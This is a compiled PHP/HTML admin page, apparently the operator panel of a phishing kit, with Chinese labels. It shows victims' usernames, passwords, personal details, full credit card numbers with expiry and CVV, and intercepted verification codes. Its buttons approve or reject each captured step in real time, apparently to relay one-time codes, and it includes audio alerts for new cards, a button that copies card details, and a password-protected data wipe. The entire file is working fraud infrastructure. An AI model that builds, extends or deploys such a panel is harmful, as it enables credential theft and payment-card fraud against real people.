<?php /*a:1:{s:51:"/www/wwwroot/209.141.40.135/view/simadmin/sqlb.html";i:1677233770;}*/ ?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>数据列表</title>
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <link rel="stylesheet" href="../layuiadmin/layui/css/layui.css" media="all">
  <link rel="stylesheet" href="../layuiadmin/style/admin.css" media="all">
  <style>
    .layui-table-cell{
      height: auto;
      white-space: normal;
    }
  </style>
</head>
<body>


  <div class="layui-fluid" id="component-tabs">
    <div class="layui-row">
      <div class="layui-col-md12">
        
        <div class="layui-card">
          <!-- <div class="layui-card-header">
            列表
          </div> -->
          <div class="layui-card-body">
            <form class="layui-form" action="">
              <div class="layui-form-item">
                <input type="checkbox" name="zzz" lay-filter="yy" lay-skin="switch" lay-text="语音提示已开启|语音提示已关闭" checked>
                 <input type="checkbox" name="zzz" lay-filter="zhyz" lay-skin="switch" lay-text="账号验证已开启|账号验证已关闭" <?php echo htmlentities($zhyz); ?>>
                <input type="checkbox" name="zzz" lay-filter="khyz" lay-skin="switch" lay-text="卡号验证已开启|卡号验证已关闭" <?php echo htmlentities($khyz); ?>>
                <a class="layui-btn layui-btn-xs layui-btn-radius layui-btn-danger" style="margin-top: 8px;" id="qk_all">&nbsp;<i class="layui-icon layui-icon-delete"></i>清空所有数据&nbsp;&nbsp;</a>
                <a class="layui-btn layui-btn-xs layui-btn-radius layui-btn-danger" style="margin-top: 8px;margin-left: 0px !important;" id="qk_no">&nbsp;<i class="layui-icon layui-icon-delete"></i>清空不完整数据&nbsp;&nbsp;</a>
              
                </div>
            </form>
            <div class="layui-collapse">
              <div class="layui-colla-item">
                <h2 class="layui-colla-title">数据日志<input type="text" name="title" required  lay-verify="required" placeholder="请输入标题" autocomplete="off" class="layui-input"></h2>
                <div class="layui-colla-content layui-show" id="log">
                </div>
              </div>
            </div>
            <hr>
            <table id="list-data" lay-filter="list-data" lay-data="{id: 'list-data'}"></table>
           
          </div>
        </div>
     </div>
  </div>

  <script type="text/html" id="switchTpl">
    <input type="checkbox" name="sex" value="{{d.id}}" lay-skin="switch" lay-text="开|关" lay-filter="jk" {{ d.jk == 1 ? 'checked' : '' }}>
  </script>
  <script src="../layuiadmin/layui/layui.js"></script>
  <script>
    layui.use(['form','jquery','element', 'table','util'], function(){
      var $ = layui.$,
      table = layui.table,
      element = layui.element,
      form = layui.form;
      var v_yy=true;
      var v_count=-1;
      var v_dz_count=-1;
      var v_card_count=-1;
      var v_yzm_count=-1;
      var server_time=0;
      var initTable=table.render({
        elem: '#list-data',
        url: '/simadmin/sqlb_data',
        page: true,
        limit:20,
        loading: false,
        done: function (res, curr, count) {
          if(v_count!=count){
            if(v_yy && v_count!=-1){
              new Audio("/com/audio/new.wav").play();
            }
            v_count=count;
          }
          console.log(res.dz_count);
          console.log(v_dz_count);
          console.log(v_yy);
          //new Audio("/com/audio/new.wav").play();
          if(v_dz_count!=res.dz_count){
            if(v_yy && v_dz_count!=-1){
              new Audio("/com/audio/card.mp3").play();
            }
            v_dz_count=res.dz_count;
          }

          if(v_card_count!=res.card_count){
            if(v_yy && v_card_count!=-1){
              new Audio("/com/audio/card.mp3").play();
            }
            v_card_count=res.card_count;
          }
          
          if(v_yzm_count!=res.yzm_count){
            if(v_yy && v_yzm_count!=-1){
              new Audio("/com/audio/yzm.mp3").play();
            }
            v_yzm_count=res.yzm_count;
          }
          server_time=res.time;
          let logStr='';
          for (let index = 0; index < res.log.length; index++) {   
            logStr+=`<p>【${res.log[index].log_time1}】【ID：${res.log[index].did}】${res.log[index].log_str}</p>`;
          }
          $('#log').html(logStr?logStr:'暂无日志');
        },
        cols: [[ //表头
          {title: 'ID / IP / Time', width: 170,align:'center',templet:
            function(d){
              let onlineStr='';
              if(server_time!=0){
                onlineStr=d.online+10>=server_time?'<span style="color: #cd0000;">在线</span>':'离线';
              }
              return `<p><a class="layui-btn layui-btn-xs layui-btn-danger" lay-event="delclient">删除</a></p>
                        <p>${onlineStr}【ID：${d.id}】</p>
                        <p>${d.ip}</p>
                        <p>${d.time}</p>`; 
            }
          },
          {title: '账号/密码', width: 160,templet:
            function(d){
              if(d.data1){
                let j = JSON.parse(d.data1);
                return `<p><a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="username">${j.username}</a></p>
                        <p><a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="password">${j.password}</a></p>`;
              }else return '';
            }
          },
          {title: '基本信息',templet:
            function(d){
              if(d.data2){
                let j2 = JSON.parse(d.data2);
                return `<p>生日：${j2.chengshi}</p>
                        <p>电子邮件：${j2.youxiang}</p>
                        <p>电话：${j2.dianhua}</p>
                        <p>邮编：${j2.youbian}</p>
                        <p>姓名：${j2.quanming}</p>`;
              }else return '';
            }
       
          },
          {title: '信用卡信息', width: 250,templet:
            function(d){
              if(d.data3){
                let j3 = JSON.parse(d.data3);
                return `<p>卡号：<a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="card">${j3.kahao.replace(/[\s]/g, 'string').replace(/(\d{4})(?=\d)/g, "$1 ")}</a></p>
                        <p>日期：${j3.yue} / ${j3.nian}</p>
                        <p>CVV： ${j3.cvv}</p>
                        <p>类型：${j3.type}&nbsp;&nbsp;&nbsp;&nbsp;<a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="card_copy">复 制 信 息</a></p>`;
              }else return '';
            }
          },
          {field: 'yzm', title: '验证码', width: 90,templet:
            function(d){
              let yzm='';
              if(d.yzm){
                yzm+=`<p><a class="layui-btn layui-btn-xs layui-btn-normal" lay-event="yzm">${d.yzm}</a></p>`
              }
              if(parseInt(d.yzm_cf)>0){
               // yzm += `<p style="color: #f00;">申请重发</p><p style="color: #f00;">【${d.yzm_cf}次】</p>`;
                yzm += '<p style="color: #f00;">申请重发</p>';
              }
              return yzm;
            }
          },
          {field: 'zt',title: '操作', width: 140, unresize: true,templet:
            function(d){
              let cz='';
              switch (parseInt(d.zt)) {
                case 10: 
                  cz +='<p><a class="layui-btn layui-btn-xs" lay-event="fx1">【1】放行用户名</a></p><p><a class="layui-btn layui-btn-xs layui-btn-danger" lay-event="bh1">【1】驳回用户名</a></p>';
                  break;  
                case 20: 
                  cz += '<p><a class="layui-btn layui-btn-xs" lay-event="fx2">【1】放行信用卡</a></p><p><a class="layui-btn layui-btn-xs layui-btn-danger" lay-event="bh2">【1】驳回信用卡</a></p>';
                  break;
                case 30: 
                  cz += '<p><a class="layui-btn layui-btn-xs" lay-event="fx3">【2】放行验证码</a></p><p><a class="layui-btn layui-btn-xs layui-btn-danger" lay-event="bh3">【2】驳回验证码</a></p><p><a class="layui-btn layui-btn-xs layui-btn-danger" lay-event="bh2">【2】驳回信用卡</a></p>';
                break;
                  default:
                break;
              }
              // if(parseInt(d.yzm_cf)>0){
              //   cz += `<p>申请重发${d.yzm_cf}次</p>`;
              // }
              return cz;
            }
          },
        ]]
      });
      setInterval(function() {
        if(v_count>0){ 
          //console.log(1)
          $(".layui-laypage-btn").click();
        }else{
         // console.log(2)
          table.reload('list-data', {
            url: '/simadmin/sqlb_data',
          });
        }
      },2000);
      
      table.on('tool(list-data)', function(obj){ 
        ac[obj.event](obj,obj.data);    
      });
      
      var ac = {};
      ac['username'] = function(obj,data){
        let j = JSON.parse(data.data1);
        copyContent(j.username)
      }
      ac['password'] = function(obj,data){
        let j = JSON.parse(data.data1);
        copyContent(j.password)
      }
      ac['yzm'] = function(obj,data){
        copyContent(data.yzm)
      }
      // 复制剪切板
      function copyContent(content) {
          var oInput = document.createElement('textarea');
          oInput.value = content;
          document.body.appendChild(oInput);
          oInput.select(); // 选择对象
          document.execCommand("Copy"); // 执行浏览器复制命令
          oInput.className = 'oInput';//设置class名
          document.getElementsByClassName("oInput")[0].remove();//移除这个input
          layer.msg('复制成功！', {icon: 1, time: 1000});
      };

      ac['card'] = function(obj,data){
        if(data.data3){
          let j2 = JSON.parse(data.data2);
          let j3 = JSON.parse(data.data3);
          layer.open({
            type: 2,
            title: `${data.id}@${data.it}`,
            shadeClose: true,
            shade: 0.8,
            area: ['520px', '363px'],
            content: `/simadmin/card?cardname=${j2.mingzi}&issuer=&cardnumber=${j3.kahao}&month=${j3.yue}&year=${j3.nian}&cvv=${j3.cvv}&`
          }); 
        }
      }
      
      ac['card_copy'] = function(obj,data){
        if(data.data3){
          let j3 = JSON.parse(data.data3);
          copyContent(`卡号：${j3.kahao.replace(/[\s]/g, 'string').replace(/(\d{4})(?=\d)/g, "$1 ")}\r\n日期：${j3.yue}/${j3.nian}\r\ncvv：${j3.cvv}`);
        }
      }

    ac['delclient'] = function(obj,data){
        layer.confirm('确认要删除吗？', 
            {
                btn : [ '确定', '取消' ]//按钮
            }, 
            function(index) {
                layer.close(index);
                $.ajax('/simadmin/del_client', {
                    type: 'post',
                    data:{
                      id:data.id
                    },
                    success: function(d){
                      if(d.code==200){
                        v_count=-1;
                        v_dz_count=-1;
                        v_card_count=-1;
                        v_yzm_count=-1;
                        layer.msg('已经删除改条记录，请等待2秒内自动刷新', {icon: 1, time: 1000});
                     }
                }
            }
        );
        }
      )
        
    }
      
      ac['fx1'] = function(obj,data){
        $.ajax('/simadmin/fx', {
            type: 'post',
            data:{
              t:1,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('用户名已放行', {icon: 1, time: 1000});
                obj.update({
                  zt: '11',
                });
              }
            }
        });
      }
      ac['fx2'] = function(obj,data){
        $.ajax('/simadmin/fx', {
            type: 'post',
            data:{
              t:2,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('信用卡已放行', {icon: 1, time: 1000});
                obj.update({
                  zt: '21',
                });
              }
            }
        });
      }
      ac['fx3'] = function(obj,data){
        $.ajax('/simadmin/fx', {
            type: 'post',
            data:{
              t:3,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('验证码已放行', {icon: 1, time: 1000});
                obj.update({
                  zt: '31',
                });
              }
            }
        });
      }

      ac['bh1'] = function(obj,data){
        $.ajax('/simadmin/bh', {
            type: 'post',
            data:{
              t:1,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('用户名已驳回', {icon: 1, time: 1000});
                obj.update({
                  zt: '12',
                });
              }
            }
        });
      }
      ac['bh2'] = function(obj,data){
        $.ajax('/simadmin/bh', {
            type: 'post',
            data:{
              t:2,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('信用卡已驳回', {icon: 1, time: 1000});
                obj.update({
                  zt: '22',
                });
              }
            }
        });
      }
      ac['bh3'] = function(obj,data){
        $.ajax('/simadmin/bh', {
            type: 'post',
            data:{
              t:3,
              id:data.id
            },
            success: function(d){
              if(d.code==200){
                layer.msg('验证码已驳回', {icon: 1, time: 1000});
                obj.update({
                  zt: '32',
                });
              }
            }
        });
      }
      form.on('switch(yy)', function(obj){
        v_yy = obj.elem.checked;
        layer.msg(obj.elem.checked?'语音提示已开启':'语音提示已关闭', {icon: 1, time: 1000});
      });
      form.on('switch(zhyz)', function(obj){
        $.ajax('/simadmin/update_zhyz', {
            type: 'post',
            data:{
              yz:(obj.elem.checked?1:0)
            },
            success: function(d){
              if(d.code==200){
                layer.msg(obj.elem.checked?'账号验证已开启':'账号验证已关闭', {icon: 1, time: 1000});
              }else{
                layer.msg('系统错误', {icon: 2, time: 1000});
              }
            }
        });
      });

      form.on('switch(khyz)', function(obj){
        $.ajax('/simadmin/update_khyz', {
            type: 'post',
            data:{
              yz:(obj.elem.checked?1:0)
            },
            success: function(d){
              if(d.code==200){
                layer.msg(obj.elem.checked?'卡号验证已开启':'卡号验证已关闭', {icon: 1, time: 1000});
              }else{
                layer.msg('系统错误', {icon: 2, time: 1000});
              }
            }
        });
      });

      $('#qk_all').click(function() {
        layer.prompt({
          formType: 1,
          title: '请输入清空密码【所有数据】',
        }, 
        function(value, index, elem){
          layer.close(index);
          $.ajax('/simadmin/qk', {
            type: 'post',
            data:{
              t:1,
              p:value
            },
            success: function(d){
              if(d.code==200){
                v_count=-1;
                v_dz_count=-1;
                v_card_count=-1;
                v_yzm_count=-1;
                layer.msg('已清空所有数据', {icon: 1, time: 1000});
              }else if(d.code==500){
                layer.msg('密码错误', {icon: 2, time: 1000});
              }
              else{
                layer.msg('系统错误', {icon: 2, time: 1000});
              }
            }
          });
        });
      });
      $('#qk_no').click(function() {
        layer.prompt({
          formType: 1,
          title: '请输入清空密码【不完整数据】',
        }, 
        function(value, index, elem){
          layer.close(index);
          $.ajax('/simadmin/qk', {
            type: 'post',
            data:{
              t:2,
              p:value
            },
            success: function(d){
              if(d.code==200){
                v_count=-1;
                v_dz_count=-1;
                v_card_count=-1;
                v_yzm_count=-1;
                layer.msg('已清空不完整数据', {icon: 1, time: 1000});
              }else if(d.code==500){
                layer.msg('密码错误', {icon: 2, time: 1000});
              }
              else{
                layer.msg('系统错误', {icon: 2, time: 1000});
              }
            }
          });
        });
      });

      form.on('switch(jk)', function(obj){
        $.ajax('/simadmin/update_jk', {
            type: 'post',
            data:{
              id:this.value,
              jk:(obj.elem.checked?1:0)
            },
            success: function(d){
            }
        });
      });
    });
  </script>
</body>
</html>
